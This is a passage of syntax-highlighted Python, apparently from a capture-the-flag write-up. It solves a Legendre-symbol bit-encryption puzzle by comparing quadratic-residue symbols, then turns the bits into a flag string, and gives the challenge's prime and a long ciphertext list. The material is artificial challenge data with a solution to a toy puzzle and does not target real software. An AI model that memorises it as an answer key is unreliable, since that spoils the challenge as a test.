leg_n = legendre_symbol(n, p)<br>        leg_a = legendre_symbol(a, p)<br><br>        <span class="hljs-comment"># 如果 (n|p) == (a|p)，则原始比特为 0，否则为 1</span><br>        bit = <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">if</span> leg_n == leg_a <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;1&#x27;</span><br>        plaintext += bit<br><br>    <span class="hljs-comment"># 将二进制字符串转换为ASCII字符</span><br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(plaintext), <span class="hljs-number">8</span>):<br>        byte = plaintext[i:i + <span class="hljs-number">8</span>]<br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(byte, <span class="hljs-number">2</span>))<br><br>    <span class="hljs-keyword">return</span> flag<br><br><br><span class="hljs-comment"># 给定的参数</span><br>p = <span class="hljs-number">303597842163255391032954159827039706827</span><br>a = <span class="hljs-number">34032839867482535877794289018590990371</span><br><br><span class="hljs-comment"># 从给定的输出中提取密文</span><br>ciphertext = [<span class="hljs-number">278121435714344315140568219459348432240</span>, <span class="hljs-number">122382422611852957172920716982592319058</span>, <span class="hljs-number">191849618185577692976529819600455462899</span>, <span class="hljs-number">94093446512724714011050732403953711672</span>, <span class="hljs-number">201558180013426239467911190374373975458</span>, <span class="hljs-number">68492033218601874497788216187574770779</span>, <span class="hljs-number">126947642955989000352009944664122898350</span>, <span class="hljs-number">219437945679126072290321638679586528971</span>, <span class="hljs-number">10408701004947909240690738287845627083</span>, <span class="hljs-number">219535988722666848383982192122753961</span>, <span class="hljs-number">173567637131203826362373646044183699942</span>, <span class="hljs-number">80338874032631996985988465309690317981</span>, <span class="hljs-number">61648326003245372053550369002454592176</span>, <span class="hljs-number">277054378705807456129952597025123788853</span>, <span class="hljs-number">17470857904503332214835106820566514388</span>, <span class="hljs-number">107319431827283329450772973114594535432</span>, <span class="hljs-number">238441423134995169136195506348909981918</span>, <span class="hljs-number">99883768658373018345315220015462465736</span>, <span class="hljs-number">188411315575174906660227928060309276647</span>, <span class="hljs-number">295943321241733900048293164549062087749</span>, <span class="hljs-number">262338278682686249081320491433984960912</span>, <span class="hljs-number">22801563060010960126532333242621361398</span>, <span class="hljs-number">36078000835066266368898887303720772866</span>, <span class="hljs-number">247425961449456125528957438120145449797</span>, <span class="hljs-number">843438089399946244829648514213686381</span>, <span class="hljs-number">134335534828960937622820717215822744145</span>, <span class="hljs-number">74167533116771086420478022805099354924</span>, <span class="hljs-number">249545124784428362766858349552876226287</span>, <span class="hljs-number">37282715721530125580150140869828301122</span>, <span class="hljs-number">196898478251078084893324399909636605522</span>, <span class="hljs-number">238696815190757698227115893728186526132</span>, <span class="hljs-number">299823696269712032566096751491934189084</span>, <span class="hljs-number">36767842703053676220422513310147909442</span>, <span class="hljs-number">281632109692842887259013724387076511623</span>, <span class="hljs-number">205224361514529735350420756653899454354</span>, <span class="hljs-number">129596988754151892987950536398173236050</span>, <span class="hljs-number">97446545236373291551224026108880226180</span>, <span class="hljs-number">14756086145599449889630210375543256004</span>, <span class="hljs-number">286168982698537894139229515711563677530</span>, <span class="hljs-number">100213185917356165383902831965625948491</span>, <span class="hljs-number">268158998117979449824644211372962370753</span>, <span class="hljs-number">264445941122079798432485452672458533870</span>, <span class="hljs-number">87798213581165493463875527911737074678</span>, <span class="hljs-number">131092115794704283915645135973964447801</span>, <span class="hljs-number">164706020771920540681638256590936188046</span>, <span class="hljs-number">178911145710348095185845690896985420147</span>, <span class="hljs-number">154776411353263771717768237918437437524</span>, <span class="hljs-number">260700611701259748940616668959555019434</span>, <span class="hljs-number">222035631087536380654643071679210307962</span>, <span class="hljs-number">281292430628313502184158157303993732703</span>, <span class="hljs-number">24585161817233257375093541076165757776</span>, <span class="hljs-number">269816384363209013058085915818661743171</span>, <span class="hljs-number">39975571110634682056180877801094873602</span>, <span class="hljs-number">125235869385356820424712474803526156473</span>, <span class="hljs-number">218090799597950517977618266111343968738</span>, <span class="hljs-number">144927096680470512196610409630841999788</span>, <span class="hljs-number">213811208492716237073777701143156745108</span>, <span class="hljs-number">64650890972496600196147221913475681291</span>, <span class="hljs-number">302694535366090904732833802133573214043</span>, <span class="hljs-number">214939649183312746702067838266793720455</span>, <span class="hljs-number">219122905927283854730628133811860801459</span>, <span class="hljs-number">224882607595640234803004206355378578645</span>, <span class="hljs-number">260797062521664439666117613111279885285</span>, <span class="hljs-number">279805661574982797810336125346375782066</span>, <span class="hljs-number">147173814739967617543091047462951522968</span>, <span class="hljs-number">23908277835281045050455945166237585493</span>, <span class="hljs-number">186338363482466926309454195056482648936</span>, <span class="hljs-number">295140548360506354817984847059061185817</span>, <span class="hljs-number">151948366859968493761034274719548683660</span>, <span class="hljs-number">96829048650546562162402357888582895187</span>, <span class="hljs-number">61129603762762161772506800496463804206</span>, <span class="hljs-number">83474322431616849774020088719454672415</span>, <span class="hljs-number">25094865151197136947956010155927090038</span>, <span class="hljs-number">86284568910378075382309315924388555908</span>, <span class="hljs-number">269311313874077441782483719283243368999</span>, <span class="hljs-number">293865655623484061732669067594899514872</span>, <span class="hljs-number">42618744258317592068586041005421369378</span>, <span class="hljs-number">54330626035773013687614797098120791595</span>, <span class="hljs-number">147903584483139198945881545544727290390</span>, <span class="hljs-number">290219451327796902155034830296135328101</span>, <span class="hljs-number">147951591390019765447087623264411247959</span>, <span class="hljs-number">176721307425594106045985172455880551666</span>, <span class="hljs-number">10617017342351249793850566048327751981</span>, <span class="hljs-number">166002147246002788729535202156354835048</span>, <span class="hljs-number">43653265786517886972591512103899543742</span>, <span class="hljs-number">191250321143079662898769478274249620839</span>, <span class="hljs-number">142288830015965036385306900781029447609</span>, <span class="hljs-number">231943053864301712428957240550789860578</span>, <span class="hljs-number">259705854206260213018172677443232515015</span>, <span class="hljs-number">42547692646223561211915772930251024103</span>, <span class="hljs-number">210863755365631055277867177762462471179</span>, <span class="hljs-number">140297326776889591830655052829600610449</span>, <span class="hljs-number">136970598261461830690726521708413303997</span>, <span class="hljs-number">93221970399798040564077738881047391445</span>, <span class="hljs-number">192314170920206027886439562261321846026</span>, <span class="hljs-number">95904582457122325051140875987053990027</span>, <span class="hljs-number">158334009503860664724416914265160737388</span>, <span class="hljs-number">134039922705083767606698907224295596883</span>, <span class="hljs-number">7789601161004867293103537392246577269</span>, <span class="hljs-number">261069289329878459425835380641261840913</span>, <span class="hljs-number">123743427894205417735664872035238090896</span>, <span class="hljs-number">20126583572929979071576315733108811761</span>, <span class="hljs-number">5317214299018099740195727361345674110</span>, <span class="hljs-number">68965882674411789667953455991785095270</span>, <span class="hljs-number">235934145208367401015357242228361016868</span>, <span class="hljs-number">250709310980093244562698210062174570956</span>, <span class="hljs-number">167048130489822745377277729681835553856</span>, <span class="hljs-number">122439593796334321806299678109589886368</span>, <span class="hljs-number">117953800124952553873241816859976377866</span>, <span class="hljs-number">226311466875372429157352019491582796620</span>, <span class="hljs-number">301401080214561977683439914412806833619</span>, <span class="hljs-number">255816105091394723475431389696875064495</span>, <span class="hljs-number">73243049441397892506665249226961409560</span>, <span class="hljs-number">226985189100195407227032930008331832009</span>, <span class="hljs-number">164462051705780513134747720427967016844</span>, <span class="hljs-number">97905180778488273557095248936896399883</span>, <span class="hljs-number">40737879120410802220891174679005117779</span>, <span class="hljs-number">180413920169781019749877067396006212488</span>, <span class="hljs-number">171309368917976988181007951396904157090</span>, <span class="hljs-number">215065878665354148046787050342635722874</span>, <span class="hljs-number">54225964222741166664978354789209176721</span>, <span class="hljs-number">179980445108969868669560591527220171967</span>, <span class="hljs-number">39118880593034932654127449293138635964</span>, <span class="hljs-number">170210538859699997092506207353260760212</span>, <span class="hljs-number">62152643864232748107111075535730424573</span>, <span class="hljs-number">28285579676042878568229909932560645217</span>, <span class="hljs-number">69823876778445954036922428013285910904</span>, <span class="hljs-number">170371231064701443428318684885998283021</span>, <span class="hljs-number">211884923965526285445904695039560930451</span>, <span class="hljs-number">2912793651373467597058997684762696593</span>, <span class="hljs-number">220544861190999177045275484705781090327</span>, <span class="hljs-number">142755270297166955179253470066788794096</span>, <span class="hljs-number">264271123927382232040584192781810655563</span>, <span class="hljs-number">214901195876112453126242978678182365781</span>, <span class="hljs-number">252916600207311996808457367909175218824</span>, <span class="hljs-number">176399700725319294248909617737135018444</span>, <span class="hljs-number">230677646264271256129104604724615560658</span>, <span class="hljs-number">1568101696521094800575010545520002520</span>, <span class="hljs-number">276644650735844694794889591823343917140</span>, <span class="hljs-number">185355461344975191330786362319126511681</span>, <span class="hljs-number">248497269558037476989199286642120676823</span>, <span class="hljs-number">27426372552503547932146407600438894266</span>, <span class="hljs-number">99885839446999373024614710052031031159</span>, <span class="hljs-number">238693364649026611386487480573211208980</span>, <span class="hljs-number">27047849084544903200283111147329657123</span>, <span class="hljs-number">261687609401872239323715016608713989139</span>, <span class="hljs-number">34926503987070847956303036393611830590</span>, <span class="hljs-number">252495954285655595492775877967398282722</span>, <span class="hljs-number">249358827602419141539353237669905281246</span>, <span class="hljs-number">42551212101869966935955269842854722856</span>, <span class="hljs-number">286527336123436427709115043975536071462</span>, <span class="hljs-number">158097411156207320921055042509886995091</span>, <span class="hljs-number">40982984899524424348979403377331335675</span>, <span class="hljs-number">87268254405858939730919659372073314983</span>, <span class="hljs-number">142920872841164853694746048293715385493</span>, <span class="hljs-number">280344634952903421792629929689092857993</span>, <span class="hljs-number">203584314487374069738101729666435007339</span>, <span class="hljs-number">76747904284507590577908045394001414841</span>, <span class="hljs-number">18608573158088521401404614102481693137</span>, <span class="hljs-number">104158289118605398449367221892619783009</span>, <span class="hljs-number">182616719368573751169836443225324741716</span>, <span class="hljs-number">272025723760783252166092979911587562064</span>, <span class="hljs-number">24194069309604403496494752448487752613</span>, <span class="hljs-number">71973842397785917741048132725314885345</span>, <span class="hljs-number">281558046604363121112749722271741416764</span>, <span class="hljs-number">66965324704079734796576428718112513855</span>, <span class="hljs-number">105222756356650324548621319241035836840</span>, <span class="hljs-number">331654051401420900830576011369146182</span>, <span class="hljs-number">131087815164777263900650262777429797113</span>, <span class="hljs-number">76104729920151139813274463849368737612</span>, <span class="hljs-number">163253554841934325278065946152769269296</span>, <span class="hljs-number">35973933431510942249046321254376084104</span>, <span class="hljs-number">223355354158871484030430212060934655984</span>, <span class="hljs-number">181704973473887713398031933516341967465</span>, <span class="hljs-number">131391458395622565487686089688656869743</span>, <span class="hljs-number">153029062510158353978320224242258979076</span>, <span class="hljs-number">75598349867958834632866616947240059419</span>, <span class="hljs-number">107656133091853571710502064573530657194</span>, <span class="hljs-number">261653899003034450454605322537555204702</span>, <span class="hljs-number">102387069931966536076616272953425585051</span>, <span class="hljs-number">174654548539988861301269811985320013260</span>, <span class="hljs-number">30731762585661721683653192240732246059</span>, <span class="hljs-number">265493340795853624586170054917042208660</span>, <span class="hljs-number">174818040730242275465453007894471517233</span>, <span class="hljs-number">99514915046145707535310601810631334278</span>, <span class="hljs-number">133978892607644700903700803642408771370</span>, <span class="hljs-number">216019770199630171637325931783378096100</span>, <span class="hljs-number">76687884966028369399497157007109898467</span>, <span class="hljs-number">262185741950606001987209986574269562289</span>, <span class="hljs-number">101935410844521914696784339882721918198</span>, <span class="hljs-number">85956270718878931834010975962772401589</span>, <span class="hljs-number">117578315837774870077915813512746446219</span>, <span class="hljs-number">209811226703488479967593762805568394383</span>, <span class="hljs-number">85782228978690599612110880989543246041</span>, <span class="hljs-number">234993402267259336147096170367513324439</span>, <span class="hljs-number">158487299348452041021565296682698871789</span>, <span class="hljs-number">159701431055714867184644360639841355076</span>, <span class="hljs-number">109022557288733938098734847159477770521</span>, <span class="hljs-number">20764822884655633017647117775843651332</span>, <span class="hljs-number">144987524936939260617020678038224835887</span>, <span class="hljs-number">214906746504968333094519539609226540495</span>, <span class="hljs-number">61852186870193663367998110214331582115</span>, <span class="hljs-number">90175894032076080713807606548780168998</span>, <span class="hljs-number">283504071501037047650569090140982777586</span>, <span class="hljs-number">267695305479884628857258564337611106120</span>, <span class="hljs-number">2466175482923380874813569827625743835</span>, <span class="hljs-number">62561740902965346823256447383892272796</span>, <span class="hljs-number">181458673990444296212252831090106274182</span>, <span class="hljs-number">151903421483215372136947284355251617709</span>, <span class="hljs-number">19545903652854510304023406921387221130</span>, <span class="hljs-number">219205004027218279279153442572018305650</span>, <span class="hljs-number">62495663621315535552427938857863551873</span>, <span class="hljs-number">12365469869484359722316573851483855865</span>, <span class="hljs-number">84444120685499458796249283893323932282</span>, <span class="hljs-number">240719245204462516267560756675192129462</span>, <span class="hljs-number">27868242791206675092288978266113368469</span>, <span class="hljs-number">231956104988320170956546781095814860314</span>, <span class="hljs-number">238410591787987745803829175586952288627</span>, <span class="hljs-number">290649141309468101840354611586699479851</span>, <span class="hljs-number">288298044918505512172272603794059992911</span>, <span class="hljs-number">43375655853069820305921366762777897508</span>, <span class="hljs-number">195308577786654489057887409352840304641</span>, <span class="hljs-number">184459971400898842809886506207633536394</span>, <span class="hljs-number">255884612697066296714973816950917234211</span>, <span class="hljs-number">8695922085804648269560669225439485137</span>, <span class="hljs-number">109407350389195091443836128149623969417</span>, <span class="hljs-number">40151058765649465408124869078260007620</span>, <span class="hljs-number">125484946058191366826510549493690011718</span>, <span class="hljs-number">71132588066103752922321942940739808864</span>, <span class="hljs-number">74434669478187680319595294456652807097</span>, <span class="hljs-number">187368213679294937718535073296853726111</span>, <span class="hljs-number">63461505676143678393259420949793811831</span>, <span class="hljs-number">131619805472714703711458729455838994067</span>, <span class="hljs-number">8579657158619864010437706463902003097</span>, <span class="hljs-number">60626278761876782233388469543817973673</span>, <span class="hljs-number">44776499706241603722632560896220653186</span>, <span class="hljs-number">257249861781237389988455384617803171877</span>, <span class="hljs-number">161899873165011719282095749671993720527</span>, <span class="hljs-number">73303482092538159761390536102771615311</span>, <span class="hljs-number">141674253732456103774983358188317473860</span>, <span class="hljs-number">112299149158347774069079224861237069975</span>, <span class="hljs-number">192409969047313867540459549167233638120</span>, <span class="hljs-number">52560717143548208264188844553309600513</span>, <span class="hljs-number">209294007943747095607573416682772182613</span>, <span class="hljs-number">65285862009539442533024037477398617382</span>, <span class="hljs-number">141465096635701758351979378177631042196</span>, <span class="hljs-number">282970656853503001128091562858564344839</span>, <span class="hljs-number">50475483578642585644452991078499278745</span>, <span class="hljs-number">162546597698227455939743094437394415689</span>, <span class="hljs-number">65258447920153625609456176138520078583</span>, <span class="hljs-number">25184730952052088803921023041299838584</span>, <span class="hljs-number">228883100940853988548836641050823478387</span>, <span class="hljs-number">234342509561041384559923481191578502671</span>, <span class="hljs-number">96929129863331626375704681481278825323</span>, <span class="hljs-number">288533470498072097357398960101692503873</span>, <span class="hljs-number">202238020435442160571930572760188491021</span>, <span class="hljs-number">179010548891454398845389500871076122861</span>, <span class="hljs-number">210509821764943794358893224681677583929</span>, <span class="hljs-number">301357944197101288505771002301759006254</span>, <span class="hljs-number">188933290023352627523422420332593360537</span>, <span class="hljs-number">207946655777875200521742190622482472884</span>, <span class="hljs-number">288626263488145443150622420747070805416</span>, <span class="hljs-number">75616301779108425588545170038742534166</span>, <span class="hljs-number">58163857263381687168244101022135667109</span>, <span class="hljs-number">297006021514663344215599115965804102114</span>, <span class="hljs-number">297690420826548736122127126645053452341</span>, <span class="hljs-number">88307045391242971429880119414942510712</span>, <span class="hljs-number">186427606153958359494215188169120285788</span>, <span class="hljs-number">135488686276533521058776859854524444361</span>, <span class="hljs-number">185380054960856211260651416683468161990</span>, <span class="hljs-number">175033658667416561573078028845860911744</span>, <span class="hljs-number">223026004671602541191897755812121342354</span>, <span class="hljs-number">34657268786986063209312902409995458857</span>, <span class="hljs-number">120560332690000675303295481174067849230</span>, <span class="hljs-number">55304621833927249516093996383526467671</span>, <span class="hljs-number">111480233798478730015825495041130765708</span>, <span class="hljs-number">188996716801525995463705449722399676888</span>, <span class="hljs-number">276300230605454487705048192796463035731</span>, <span class="hljs-number">195951365841304132244984630163178946841</span>, <span class="hljs-number">97383655947416522972353051984313703380</span>, <span class="hljs-number">94486945760999630041197414137963583839</span>, <span class="hljs-number">180706938513681126017333618518691884990</span>, <span class="hljs-number">291355503207799224380050183085704824037</span>, <span class="hljs-number">69034413486375685936282884707402207337</span>, <span class="hljs-number">147750870458026934714106830614187010708</span>, <span class="hljs-number">45030500748522416863096615057804736553</span>, <span class="hljs-number">242760053973560804002707125041520857401</span>, <span class="hljs-number">78549841097746795170488790352479728712</span>, <span class="hljs-number">2356186555504071026416878904180857750</span>, <span class="hljs-number">250486437623828232647064146324392061051</span>, <span class="hljs-number">23443836455198610186212360005846025976</span>, <span class="hljs-number">174557226633145985326629017377610499133</span>, <span class="hljs-number">105578481831185315088267357915446186040</span>, <span class="hljs-number">275620780071666328887795273613981325091</span>, <span class="hljs-number">23435505408737317601794562472269448966</span>, <span class="hljs-number">153209223406380813663608757935808571040</span>, <span class="hljs-number">298537417505667302508269715871007454162</span>, <span class="hljs-number">203833907122687718347615710181705388877</span>, <span class="hljs-number">41923370405573382737900061813058979798</span>, <span class="hljs-number">3762696947926387653032627637114050038</span>, <span class="hljs-number">201362054098012734707571348865729525585</span>, <span class="hljs-number">285561801443127226417656620776228615886</span>, <span class="hljs-number">111526376057659222252771678197929357387</span>, <span class="hljs-number">203857473647840873587593099562928738804</span>, <span class="hljs-number">44500972779851392967974092230683443589</span>, <span class="hljs-number">131565609415497588649207556985146740667</span>, <span class="hljs-number">118140388348838985266223643241117982200</span>, <span class="hljs-number">151449885527204880099343472664885565851</span>, <span class="hljs-number">296392921256617994387220911796693904909</span>, <span class="hljs-number">171323803851876663161606688343678019752</span>, <span class="hljs-number">77152982746512263077542395226111426871</span>, <span class="hljs-number">71648764903315646849225859605038798241</span>, <span class="hljs-number">204032734481806785543119754456569617316</span>, <span class="hljs-number">6308687907566364067313782129902290691</span>, <span class="hljs-number">16601010504475415688487155708691097587</span>, <span class="hljs-number">267844409827567109183739120606590016153</span>, <span class="hljs-number">8224746302136608660764206696943998066</span>, <span class="hljs-number">66759882079234093195284745682061177129</span>, <span class="hljs-number">246382951504754280882643835151081337286</span>, <span class="hljs-number">255668159720160142170457715248631352728</span>, <span class="hljs-number">198682585307670767869381177003851088434</span>, <span class="hljs-number">52435298055396076040371814840062860322</span>, <span class="hljs-number">71487031168170283085378067681578926209</span>, <span class="hljs-number">19270201008106231446848331516948751837</span>, <span class="hljs-number">259975200953378762173082382130139147342</span>, <span class="hljs-number">100957428421542421187997144087873975651</span>, <span class="hljs-number">208596806512779765020431672051552927799</span>, <span class="hljs-number">299145970783704112359526450087000033589</span>, <span class="hljs-number">150947534399996219237186223933189906692</span>, <span class="hljs-number">2048564430495506099844799218948689248</span>, <span class="hljs-number">18962488382754079143174369765373573160</span>, <span class="hljs-number">123031997265327646442638576943887737076</span>, <span class="hljs-number">244982544573374061178705105734141424990</span>, <span class="hljs-number">146410849043938910996544914770892579969</span>, <span class="hljs-number">223289253099676841267315311685506771609</span>, <span class="hljs-number">51374350072145272462874563304717832675</span>, <span class="hljs-number">11071799523780604861063183113721965515</span>, <span class="hljs-number">64879815349665030137608387728274669513</span>, <span class="hljs-number">80407660651138778640313857555610913997</span>, <span class="hljs-number">303240361297474032656368918727922343524</span>, <span class="hljs-number">103535171867293830164396688627880762056</span>, <span class="hljs-number">80560992291681297484967629700766125368</span>, <span class="hljs-number">143230791823232014720768325847406122476</span>, <span class="hljs-number">188716605362804777650654549500430035344</span>, <span class="hljs-number">232870220205325961834389425482865329315</span>, <span class="hljs-number">283584919111555062850512413920721407255</span>, <span class="hljs-number">206566027046056486360456937040463884619</span>, <span class="hljs-number">157265544558229360994066706355140059167</span>, <span class="hljs-number">234540100059557817987307855523008271441</span>, <span class="hljs-number">145080729935010940836509908225154438654</span>, <span class="hljs-number">87632901547252991486640361323948527297</span>, <span class="hljs-number">132851295075144433057295220850764336697</span>, <span class="hljs-number">119332580967710872282556206817561230364</span>, <span class="hljs-number">252662535367310697404410284791596079390</span>, <span class="hljs-number">116953597995893914045234747272641030589</span>, <span class="hljs-number">100249498080127826743176896590140549012</span>, <span class="hljs-number">136127222991007877469608037092253387587</span>, <span class="hljs-number">293872159333237281344632727438901916796</span>, <span class="hljs-number">188380258232793584033919525452891729603</span>, <span class="hljs-number">1610116068556601814921533488550773010</span>, <span class="hljs-number">227538093179017809788576278302184723209</span>, <span class="hljs-number">96083211912155805281570727244009758189</span>, <span class="hljs-number">177565192075026414675108774674272650977</span>, <span class="hljs-number">48610376097473152433617435307712235835</span>, <span class="hljs-number">247706157308906487216795222963091222950</span>, <span class="hljs-number">158089460554439410339817265377357657075</span>, <span class="hljs-number">242596743543458727108836420358578527964</span>, <span class="hljs-number">157838486547678450498998359338995593594</span>, <span class="hljs-number">154936428786673098370270244313756793764</span>, <span class="hljs-number">230069001282099253337070315838992422706</span>, <span class="hljs-number">302203905412042965194022309363722872023</span>, <span class="hljs-number">278925578180003228386990239779184911424</span>, <span class="hljs-number">2121847168422140085785053284950978779</span>, <span class="hljs-number">88186566913792352545205577594300112005</span>, <span class="hljs-number">127051055548524716972172930848069016819</span>, <span class="hljs-number">216775577660712694343189516378309335187</span>, <span class="hljs-number">44934779747684486400910901018161470888</span>, <span class="hljs-number">32429597712898788634301884219187226083</span>, <span class="hljs-number">219683174528279300995710495669083670544</span>, <span class="hljs-number">37001671152735870067433052249003677244</span>, <span class="hljs-number">40408367335919429215031155701333780256</span>, <span class="hljs-number">156957056705864208022145617831060134907</span>, <span class="hljs-number">180077610045061934161783737112285900966</span>, <span class="hljs-number">59357544819520045255625797086421901884</span>, <span class="hljs-number">77751400794807935281264495346525107329</span>, <span class="hljs-number">4517615764752715802675887411287287137</span>, <span class="hljs-number">76319782726782483955139757169428276003</span>, <span class="hljs-number">176009402215469456144386392247781430661</span>, <span class="hljs-number">283055695252017869386094188584670242363</span>, <span class="hljs-number">20001716567499724882317501875143788088</span>, <span class="hljs-number">125228382132280749989067609697418628387</span>, <span class="hljs-number">144053090751393640875176862167012247830</span>, <span class="hljs-number">15289106046221987660093620422889539867</span>, <span class="hljs-number">111243866573605033251079958638430165633</span>, <span class="hljs-number">169264885994758018612038619809803723688</span>, <span class="hljs-number">11895954311759483419234457833286931577</span>, <span class="hljs-number">273147053963507607445612310063799123998</span>, <span class="hljs-number">158981773284803069491507978382595811562</span>, <span class="hljs-number">41293513794446810141896116395025053234</span>, <span class="hljs-number">57441237860743029006005815967510568612</span>, <span class="hljs-number">109171476551418034153338841133917497633</span>, <span class="hljs-number">136539712287056106151501004438585146777</span>, <span class="hljs-number">278918550892367788720071091355436733468</span>, <span class="hljs-number">211360251223022250021398148918837686812</span>, <span class="hljs-number">254351242496347083009146404917085951637</span>, <span class="hljs-number">130260153203964833202474997491055897705</span>, <span class="hljs-number">221930288825889900517852991745469270910</span>, <span class="hljs-number">66354211799382156899053592476719001842</span>, <span class="hljs-number">127898620670768976254134750731374490934</span>, <span class="hljs-number">298131830425274848646460016809595859328</span>, <span class="hljs-number">132109510144911727511061804395381822418</span>, <span class="hljs-number">210917766469026421985352121201196497206</span>, <span class="hljs-number">5441137715689271309917542693016936841</span>, <span class="hljs-number">209516950406881264617228336887254107528</span>, <span class="hljs-number">92275151703152148383106907311559718841</span>, <span class="hljs-number">46255650973652148247469464088017660080</span>, <span class="hljs-number">182628529221607295465655096378164148336</span>, <span class="hljs-number">52574278547120304143820897608762444985</span>, <span class="hljs-number">63698472804719856407197390836793525437</span>, <span class="hljs-number">30457182690865024857724004613999433676</span>, <span class="hljs-number">212073418196280214618461610817423630022</span>, <span class="hljs-number">48875930775858981513092672396243080640</span>, <span class="hljs-number">113234797533868946026347891158142991388</span>, <span class="hljs-number">256534108458875318962058222544020064164</span>, <span class="hljs-number">22522715662428558833985333846937440705</span>, <span class="hljs-number">97553118958308509177643330175409499003</span>, <span class="hljs-number">197088081433425221073434635573357125592</span>, <span class="hljs-number">157303116668734020456228309942188293059</span>, <span class="hljs-number">110316346669278795114546305726864504681</span>, <span class="hljs-number">228887397917708007004920589862367347873</span>, <span class="hljs-number">112210930213921962308944716344585917343</span>, <span class="hljs-number">95017760786235266842788931502689331157</span>, <span class="hljs-number">303479014347753799316861720146531596843</span>, <span class="hljs-number">138677197920058856282155251074088437081</span>, <span class="hljs-number">285912176726299387362893467150449209426</span>, <span class="hljs-number">120309832759140713296686339140142433386</span>, <span class="hljs-number">279125897926861811239250830750932241600</span>, <span class="hljs-number">289502053647872994218190050825294169535</span>, <span class="hljs-number">262459212837236162171047720358005836712</span>, <span class="hljs-number">290390838897912466575239533978002826151</span>, <span class="hljs-number">292988850197951752250595007039860868400</span>, <span class="hljs-number">34796135808311610468205608686622819504</span>, <span class="hljs-number">25206338413385638687826160218013868658</span>, <span class="hljs-number">42180804482932648992176529097078580055</span>, <span class="hljs-number">195897225052351816559125785179252565465</span>, <span class="hljs-number">290060760535408066224831756224248708027</span>, <span class="hljs-number">34243626514368402883316460494646065629</span>, <span class="hljs-number">159497726968729366867935528734367549832</span>, <span class="hljs-number">267785772871046662107247674801793846921</span>, <span class="hljs-number">47342328853090920958565777290912999560</span>, <span class="hljs-number">194980176549393239742230551297786993434</span>, <span class="hljs-number">88020247887557921707284362381274951852</span>, <span class="hljs-number">255474100333005567974457204812640809071</span>, <span class="hljs-number">93324791124684170744053910877870176609</span>, <span class="hljs-number">69542826141091170218040988642070014011</span>, <span class="hljs-number">188678529221313094426441439309063681864</span>, <span class="hljs-number">56030802691247887446204447769438570825</span>, <span class="hljs-number">74312207153349149422500961216106557393</span>, <span class="hljs-number">153811406554673020809393530896156460494</span>, <span class="hljs-number">130232956128662318657579623819323546361</span>, <span class="hljs-number">241587755919930468705435097001858194189</span>, <span class="hljs-number">150548598672513907492388638742866339038</span>, <span class="hljs-number">38780469811591978249139697733603217652</span>, <span class="hljs-number">237554030153815380781978075720171312418</span>, <span class="hljs-number">96541634878634946114738393982914693394</span>, <span class="hljs-number">83284071476491638125716901346418260661</span>, <span class="hljs-number">277535192833115492238855935055373371297</span>, <span class="hljs-number">92291115416977028401374199691398676627</span>, <span class="hljs-number">105634075531674200869064066234662065605</span>, <span class="hljs-number">59669321288506854711632528171527160495</span>, <span class="hljs-number">24913178886798791108798737682436779604</span>, <span class="hljs-number">191902245938756063865405758957515936934</span>, <span class="hljs-number">200833770402179506644143905670947994664</span>, <span class="hljs-number">249327029439265065126080906281744759655</span>, <span class="hljs-number">2368715218056973901783211260781833927</span>, <span class="hljs-number">133209645820509536502329231321782644514</span>, <span class="hljs-number">170083361139958757944996287868734988169</span>, <span class="hljs-number">143242266754832252556264383809361085258</span>, <span class="hljs-number">198438133508477313319510861550461456953</span>, <span class="hljs-number">226416574016152349355240811564666677855</span>, <span class="hljs-number">131995850810926550122710727062184985075</span>, <span class="hljs-number">206211971624338783828953817981719254101</span>, <span class="hljs-number">95022339713176475801874420969255633409</span>, <span class="hljs-number">39239785273544046574575511790952158726</span>, <span class="hljs-number">6761950061835300419279903725369635970</span>, <span class="hljs-number">160849355761964483498641169767552240859</span>, <span class="hljs-number">44129081383649229398785011378026849128</span>, <span class="hljs-number">116611486899507912253396257166983831123</span>, <span class="hljs-number">102748760887182142877957834312659347601</span>, <span class="hljs-number">100973668783270797012352094429175531207</span>, <span class="hljs-number">110548564207426762905750742091610942634</span>, <span class="hljs-number">205424582078496700107783237952155124442</span>, <span class="hljs-number">210932790939110827079725957948996247757</span>, <span class="hljs-number">54413304958149902897514912130730392489</span>, <span class="hljs-number">181315803651356180100745517014898850424</span>, <span class="hljs-number">183346938138867395962624263310328788228</span>, <span class="hljs-number">133507835720650939452036529283981720094</span>, <span class="hljs-number">244220649646693249242542702657146329679</span>, <span class="hljs-number">111814540087048948955999016117121133729</span>, <span class="hljs-number">210757262617434713384638061648414714521</span>, <span class="hljs-number">31712005436857719771604404352654183712</span>, <span class="hljs-number">299210790483067037892753875410776716305</span>, <span class="hljs-number">34216439939230284515095120240039231491</span>, <span class="hljs-number">246820219620854547856488049434101568744</span>, <span class="hljs-number">298588211282375015522910461809769779222</span>, <span class="hljs-number">53320103067319149790078933423751044737</span>, <span class="hljs-number">164977173816081040725650999609390274279</span>, <span class="hljs-number">234782977255751828939911143180631329578</span>, <span class="hljs-number">61521250269407451751766565186333346163</span>, <span class="hljs-number">119529895182262920689181379893081203421</span>, <span class="hljs-number">154588465395872896210615516764102943961</span>, <span class="hljs-number">153034255402211966905777978896125271527</span>, <span class="hljs-number">65497510688725487475002809757533544579</span>, <span class="hljs-number">76824114145168270682129892469858568031</span>, <span class="hljs-number">218064880554787781811938382300930885801</span>, <span class="hljs-number">196850060586188141836799779247809406205</span>, <span class="hljs-number">176023892018381269394229104598502170110</span>, <span class="hljs-number">32491776807255207889633110137157036238</span>, <span class="hljs-number">41150198830446315717651890670848632754</span>, <span class="hljs-number">260753023840843193587871227195221789744</span>, <span class="hljs-number">48345408122882987831052823644867513356</span>, <span class="hljs-number">80045935233531979816083287928071697883</span>, <span class="hljs-number">131878104259519592871955471048058374000</span>, <span class="hljs-number">15534379538690707223440448056318568055</span>, <span class="hljs-number">131291412522855581131329717355299310716</span>, <span class="hljs-number">37018675243998552749630837151597269431</span>, <span class="hljs-number">144343493968520204610097930388908478903</span>, <span class="hljs-number">67236444178494959708570043908346657722</span>, <span class="hljs-number">102574100831305499879105427279131095784</span>, <span class="hljs-number">249069309513964056714882166119752611668</span>, <span class="hljs-number">210718130986716991560768592011623825976</span>, <span class="hljs-number">266242407402824082344585571101593909650</span>, <span class="hljs-number">205203132247422842477137158586071965100</span>, <span 